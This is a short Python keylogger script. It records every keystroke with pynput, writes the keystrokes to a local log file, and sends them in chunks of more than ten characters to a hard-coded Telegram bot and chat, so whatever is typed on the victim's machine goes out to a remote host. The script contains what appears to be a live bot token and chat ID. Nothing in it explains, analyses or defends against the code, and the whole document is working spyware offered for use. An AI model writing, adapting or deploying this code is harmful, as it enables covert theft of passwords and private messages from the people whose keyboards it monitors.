import telebot
from pynput.keyboard import Listener

bot_token = "7604151288:AAFDwjU1b9ZqYnKzlvC4i7GrNIrVoFYvx6c"  # Paste your Telegram Bot Token here
chat_id = "6008169818"

bot = telebot.TeleBot(bot_token)
keys = ""

def send_telegram(message):
    try:
        bot.send_message(chat_id, message)
    except:
        pass

def write_to_file(keys):
    with open("logs.txt", "a") as file:
        file.write(keys + "\n")

def on_press(key):
    global keys
    try:
        keys += key.char
    except AttributeError:
        keys += " " + str(key) + " "

    if len(keys) > 10:
        send_telegram(keys)
        write_to_file(keys)
        keys = ""

with Listener(on_press=on_press) as listener:
    listener.join()
